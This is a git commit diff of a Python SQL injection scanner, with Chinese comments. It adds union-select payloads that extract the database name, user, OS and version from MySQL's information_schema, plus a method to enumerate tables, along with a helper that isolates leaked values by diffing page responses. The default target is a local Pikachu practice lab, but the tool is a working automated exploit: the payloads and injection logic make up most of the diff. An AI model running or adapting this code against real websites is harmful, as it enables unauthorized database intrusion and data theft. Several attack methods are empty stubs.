8da82976ff3e9241206786cebee1f79075b1cfef
Longersking <1252175690@qq.com>
2023-12-04 16:20:25 +0800

    new commit

--- scanner/sql_injection/mysql_attack.py
+++ scanner/sql_injection/mysql_attack.py
@@ -1,34 +1,39 @@
 from utils.http_tools import HTTPTools
+from utils.character_tools import CharacterTools
 
-WITHOUT_VULNERABILITY = 0
-INACCESSIBLE = 1
-WITH_ECHO = 3
-WITHOUT_ECHO = 2
+#自定义目标sql注入状态
+WITHOUT_VULNERABILITY = 0 #不可注入
+INACCESSIBLE = 1 #无法访问
+WITHOUT_ECHO = 2 #无回显的
+WITH_ECHO = 3 #可回显的
+
 
 class MysqlAttack:
     def __init__(self,url,http_message = None):
-        self.method = HTTPTools.check_request_method(url)
-        self.url = url
-        self.parse_url,self.query_parameters = HTTPTools.get_argv(url)
-        self.argv = list(self.query_parameters.keys())
-        self.null_length = None
-        self.flag_length = None
-        self.http_message = http_message
+        # ================目标参数==================
+        self.method = HTTPTools.check_request_method(url)   #确定攻击的提交方法get/post
+        self.url = url  #目标原始url
+        self.parse_url,self.query_parameters = HTTPTools.get_argv(url)      #格式化url
+        self.argvs = list(self.query_parameters.keys())     #可利用参数
+        self.null_length = None    #无参字长
+        self.flag_length = None    #标记字长
+        self.null_content = None   #无参数访问
+        self.target_flags = []     #相关参数
+        # ================破解参数==================
+
         # 字典payload，用来爆破当前数据库，当前用户，以及对方操作系统
-        self.payloads = {
+        self.poc_payloads = {
+            "number":" and 2013 = 2014 #",
+            "character": " ' and 2013 = 2014 #"
+        }
+        self.exp_payloads = {
             "database":"database() from information_schema.schemata #",
             "user":"user() from information_schema.schemata #",
             "os":"@@version_compile_os from information_schema.schemata #",
-            "version":"version() from information_schema.schemata #",
-            "number":" and 2013 = 2014 #",
-            "character":" ' and 2013 = 2014 #"
+            "version":"version() from information_schema.schemata #"
         }
-        self.database = None
-        self.user = None
-        self.databases = []
-        self.tables = []
-        self.columns = []
-        self.datas = []
+        self.result = []
+        # 利用ascill爆破数据
         self.ascii_table = [
             0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15,16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31,
             32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47,48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63,
@@ -39,20 +44,40 @@ class MysqlAttack:
             192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207,208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223,
             224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239,240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255
         ]
-    def get_available_argv(self):
-        print(self.query_parameters)
-        self.flag_length = len(HTTPTools.send_get_request(self.url).content)
+    # def get_available_argv(self):
+    #     # print(self.query_parameters)
+    #     # 标记原始字长
+    #     print(self.url)
+    #     self.flag_length = len(HTTPTools.send_get_request(self.url).content)
+    #     print(len(HTTPTools.send_get_request(self.url).content))
+    #     url = HTTPTools.update_url_parameters(self.parse_url,self.query_parameters,{'name':"","submit":""})
+    #     # 标记无参字长
+    #     print(url)
+    #     print(len(HTTPTools.send_get_request(url).content))
+    #     self.null_length = len(HTTPTools.send_get_request(url).content)
+    # 
+    #     # url = HTTPTools.update_url(self.parse_url, self.query_parameters, "name", "666666666")
+    # 
+    # 
+    #     for arg in self.argvs:
+    # 
+    #         url = HTTPTools.update_url(self.parse_url,self.query_parameters,arg,"6666666666")
+    #         print(url)
+    #         print(len(HTTPTools.send_get_request(url).content))
 
-        url = HTTPTools.update_url_parameters(self.parse_url,self.query_parameters,{'name':"","submit":""})
-        self.null_length = len(HTTPTools.send_get_request(url).content)
+    #回显方法
+    def echo(self,content):
+        response = CharacterTools.remove_html_tags(CharacterTools.find_different_chars(content,self.null_content))
+        return response
 
-        url = HTTPTools.update_url(self.parse_url, self.query_parameters, "name", "666666666")
+    # 结果集归纳
+    def init_data(self):
+        self.database = self.result[0]
+        self.user = self.result[1]
+        self.os = self.result[2]
+        self.version= self.result[3]
 
-        for arg in self.argv:
-
-            url = HTTPTools.update_url(self.parse_url,self.query_parameters,arg,"666666666")
-
-
+    # 判断能否进行sql攻击,以及攻击类型
     def is_sql_attack(self,url):
         if HTTPTools.send_get_request(url=url).status_code != 200:
             print("无法访问")
@@ -67,8 +92,44 @@ class MysqlAttack:
                     return WITHOUT_ECHO
             return WITHOUT_VULNERABILITY
 
+    #获取表名
+    def get_tables(self):
+        sql = "1' union select "
+        sql_payload = sql + "* from " + self.database
+        print(sql_payload)
+        url = HTTPTools.update_url(self.parse_url, self.query_parameters, self.argvs[0], sql_payload)
+        response = str(HTTPTools.send_get_request(url).content)
+        self.echo(response)
+        print(self.echo(response))
+
+
     def normal_attack(self):
-        pass
+        # sql语句
+        sql = "1' union select 1,"
+        # 参数置空
+        url = HTTPTools.update_url_parameters(self.parse_url, self.query_parameters, {'name': "", "submit": ""})
+        # 记录空参数访问的页面结果
+        self.null_content = str(HTTPTools.send_get_request(url).content)
+        # payload 拼接攻击，一次爆破，数据库，用户，操作系统，版本信息
+        for argv,payload in self.exp_payloads.items():
+            sql_payload = sql + self.exp_payloads[argv]
+            print(sql_payload)
+            # 修改url
+            url = HTTPTools.update_url(self.parse_url,self.query_parameters,self.argvs[0],sql_payload)
+            # 获取url访问的攻击结果
+            response = str(HTTPTools.send_get_request(url).content)
+            # 与空参页面进行比较处理结果
+            self.result.append(self.echo(response))
+        #处理数据结果
+        result = CharacterTools.longest_common_substring(self.result)
+        if result not in self.target_flags:
+            self.target_flags.append(result)
+        self.result = CharacterTools.remove_substring(self.result, result)
+        self.init_data()
+        print(self.result)
+        self.get_tables()
+
+
 
     def encode_attack(self):
         pass
@@ -79,10 +140,17 @@ class MysqlAttack:
     def boolean_attack(self):
         pass
 
+    def main(self,url):
+        self.flag_length = len(HTTPTools.send_get_request(self.url).content)    #设置标记字长
+        url = HTTPTools.update_url_parameters(self.parse_url,self.query_parameters,{'name':"","submit":""})   #url参数置空
+        self.null_content = HTTPTools.send_get_request(url).content    #无参内容
+        self.null_length = len(self.null_content)   #无参字长
+        self.normal_attack()
+
+        # print(len(HTTPTools.send_get_request(url).content))
+
 if __name__ == "__main__":
     url = "http://127.0.0.1/pikachu-master/vul/sqli/sqli_str.php?name=1%27&submit=%E6%9F%A5%E8%AF%A2"
     mysql_attack = MysqlAttack(url=url)
-    # # mysql_attack.is_sql_attack()
-    print(mysql_attack.is_sql_attack(url))
-    mysql_attack.get_available_argv()
-    # print(len(HTTPTools.send_get_request(url).content))
+    mysql_attack.main(url)
+    print(mysql_attack.database)
---
+++ utils/character_tools.py
@@ -0,0 +1,68 @@
+import difflib
+from bs4 import BeautifulSoup
+
+class CharacterTools:
+    def __init__(self):
+        pass
+
+    #选出两段字符串中的差异部分
+    @staticmethod
+    def find_different_chars(str1, str2):
+        # 使用 ndiff 找到不同的部分
+        diff = difflib.ndiff(str1, str2)
+        # 从差异中提取不同的字符串
+        diff_chars = ''.join(x[-1] for x in diff if x.startswith('- '))
+        return diff_chars
+
+    #去除html标签
+    @staticmethod
+    def remove_html_tags(html):
+        # 使用BeautifulSoup去除标签
+        soup = BeautifulSoup(html, "html.parser")
+        text = soup.get_text(separator=" ")
+        return text
+
+    # 选出公共最长子串
+    @staticmethod
+    def longest_common_substring(strs):
+        if not strs:
+            return ""
+
+        # 获取字符串列表中最短的字符串长度
+        min_len = min(len(s) for s in strs)
+        max_sub = ""
+
+        for i in range(min_len):
+            for j in range(i + 1, min_len + 1):
+                sub = strs[0][i:j]  # 取第一个字符串的子串
+                if all(sub in s for s in strs[1:]):  # 检查是否为所有字符串的子串
+                    if len(sub) > len(max_sub):
+                        max_sub = sub
+
+        return max_sub
+
+    # 去除指定字符
+    @staticmethod
+    def remove_substring(strs, substring):
+        result = []
+
+        for s in strs:
+            # 使用 replace 函数去除指定子串
+            updated_s = s.replace(substring, '')
+            result.append(updated_s)
+
+        return result
+
+
+if __name__ == "__main__":
+    character_tools = CharacterTools()
+    # 测试
+    string_list = [
+        'your uid:1  your email is: pikachu',
+        'your uid:1  your email is: root@localhost',
+        'your uid:1  your email is: Win64',
+        'your uid:1  your email is: 5.7.26'
+    ]
+    result = character_tools.longest_common_substring(string_list)
+    print(character_tools.remove_substring(string_list,result))
+
